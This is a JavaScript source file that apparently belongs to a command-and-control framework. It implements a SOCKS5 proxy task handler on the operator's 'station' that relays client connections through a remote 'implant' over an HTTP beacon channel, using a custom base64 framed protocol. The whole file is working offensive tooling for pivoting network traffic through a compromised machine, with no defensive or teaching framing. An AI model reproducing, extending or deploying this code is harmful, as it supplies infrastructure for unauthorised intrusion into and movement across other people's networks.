// SOCKS5 Proxy TaskHandler
// Runs a SOCKS5 listener on the station. Incoming connections are parsed for
// SOCKS5 CONNECT, then multiplexed to the implant via the HTTP beacon channel.
//
// Wire protocol (station ↔ implant, newline-delimited frames):
//   C:<ch>:<host>:<port>   connect request  (station → implant)
//   K:<ch>                 connected OK      (implant → station)
//   E:<ch>:<reason>        connect error     (implant → station)
//   D:<ch>:<b64data>       tunnel data       (bidirectional)
//   X:<ch>                 channel close     (bidirectional)
//   S                      stop proxy        (station → implant)

import net from 'net'

export class TaskHandler {
  constructor(task) {
    this.task = task
    this.channels = new Map()
    this.implantQueue = []
    this.nextCh = 1
    this.stopping = false

    const params = JSON.parse(task.parameters)
    const port = parseInt(params.port) || 1080
    this.failed = false

    this.server = net.createServer(sock => this._onClient(sock))
    this.server.on('error', (err) => {
      this.failed = true
      this.task.output = `SOCKS5 error: ${err.message}`
      this.task.completed_at = Date.now()
      db.prepare(`UPDATE tasks SET (output, completed_at) = ($output, $completed_at) WHERE id = $task_id`)
        .run({ task_id: task.id, output: this.task.output, completed_at: this.task.completed_at })
      io('task_complete', this.task)
    })
    this.server.listen(port, '127.0.0.1')

    const display = `SOCKS5 Proxy :${port}`
    db.prepare(`UPDATE tasks SET display = $display WHERE id = $task_id`)
      .run({ task_id: task.id, display })
    this.task.display = display
  }

  _onClient(sock) {
    let phase = 'greeting'
    const ch = this.nextCh++
    const channel = {
      socket: sock,
      outbound: [],
      state: 'handshake',
      host: null,
      port: null,
    }
    this.channels.set(ch, channel)

    const onData = (data) => {
      if (phase === 'greeting') {
        if (data[0] !== 0x05) { sock.end(); this.channels.delete(ch); return }
        sock.write(Buffer.from([0x05, 0x00]))
        phase = 'request'
      } else if (phase === 'request') {
        if (data[1] !== 0x01) {
          sock.write(Buffer.from([0x05, 0x07, 0x00, 0x01, 0,0,0,0, 0,0]))
          sock.end(); this.channels.delete(ch); return
        }
        const atyp = data[3]
        let host, port
        if (atyp === 0x01) {
          host = `${data[4]}.${data[5]}.${data[6]}.${data[7]}`
          port = data.readUInt16BE(8)
        } else if (atyp === 0x03) {
          const len = data[4]
          host = data.slice(5, 5 + len).toString()
          port = data.readUInt16BE(5 + len)
        } else {
          sock.write(Buffer.from([0x05, 0x08, 0x00, 0x01, 0,0,0,0, 0,0]))
          sock.end(); this.channels.delete(ch); return
        }
        channel.host = host
        channel.port = port
        channel.state = 'connecting'
        this.implantQueue.push(`C:${ch}:${host}:${port}`)
        phase = 'tunnel'
      } else if (phase === 'tunnel') {
        if (channel.state === 'connected') {
          this.implantQueue.push(`D:${ch}:${data.toString('base64')}`)
        } else {
          channel.outbound.push(data)
        }
      }
    }

    sock.on('data', onData)
    sock.on('close', () => {
      if (this.channels.has(ch)) {
        this.implantQueue.push(`X:${ch}`)
        this.channels.delete(ch)
      }
    })
    sock.on('error', () => {
      if (this.channels.has(ch)) {
        this.implantQueue.push(`X:${ch}`)
        this.channels.delete(ch)
      }
    })
  }

  getTask = async function (req, res) {
    const instruction = `${this.task.id}:${Buffer.from('SOCKS5_START:' + this.task.id).toString('base64')}`
    res.send(instruction)
  }

  taskIO = async function (req, res) {
    const raw = req.body || ''
    const body = raw ? Buffer.from(raw, 'base64').toString('utf8') : ''
    const lines = body.split('\n').filter(l => l.length > 0)

    for (const line of lines) {
      const colon1 = line.indexOf(':')
      if (colon1 === -1) continue
      const op = line.substring(0, colon1)
      const rest = line.substring(colon1 + 1)

      if (op === 'K') {
        const ch = parseInt(rest)
        const channel = this.channels.get(ch)
        if (channel) {
          channel.state = 'connected'
          channel.socket.write(Buffer.from([0x05, 0x00, 0x00, 0x01, 0,0,0,0, 0,0]))
          for (const buf of channel.outbound) {
            this.implantQueue.push(`D:${ch}:${buf.toString('base64')}`)
          }
          channel.outbound = []
        }
      } else if (op === 'E') {
        const colon2 = rest.indexOf(':')
        const ch = parseInt(colon2 === -1 ? rest : rest.substring(0, colon2))
        const channel = this.channels.get(ch)
        if (channel) {
          channel.socket.write(Buffer.from([0x05, 0x04, 0x00, 0x01, 0,0,0,0, 0,0]))
          channel.socket.end()
          this.channels.delete(ch)
        }
      } else if (op === 'D') {
        const colon2 = rest.indexOf(':')
        if (colon2 === -1) continue
        const ch = parseInt(rest.substring(0, colon2))
        const b64 = rest.substring(colon2 + 1)
        const channel = this.channels.get(ch)
        if (channel && channel.socket.writable) {
          channel.socket.write(Buffer.from(b64, 'base64'))
        }
      } else if (op === 'X') {
        const ch = parseInt(rest)
        const channel = this.channels.get(ch)
        if (channel) {
          channel.socket.end()
          this.channels.delete(ch)
        }
      }
    }

    if (this.stopping || this.failed) {
      this.implantQueue.push('S')
    }

    const response = this.implantQueue.join('\n')
    this.implantQueue = []
    res.type('text/plain').send(response)

    if (this.stopping || this.failed) {
      this._cleanup()
    }
  }

  stop() {
    this.stopping = true
    this.server.close()
    for (const [, channel] of this.channels) {
      channel.socket.end()
    }
    this.channels.clear()
  }

  _cleanup() {
    this.task.output = 'SOCKS5 proxy stopped'
    this.task.completed_at = Date.now()
    db.prepare(`UPDATE tasks SET (output, completed_at) = ($output, $completed_at) WHERE id = $task_id`)
      .run({ task_id: this.task.id, output: this.task.output, completed_at: this.task.completed_at })
    io('task_complete', this.task)
    delete active_implant_handlers[this.task.id]
  }
}
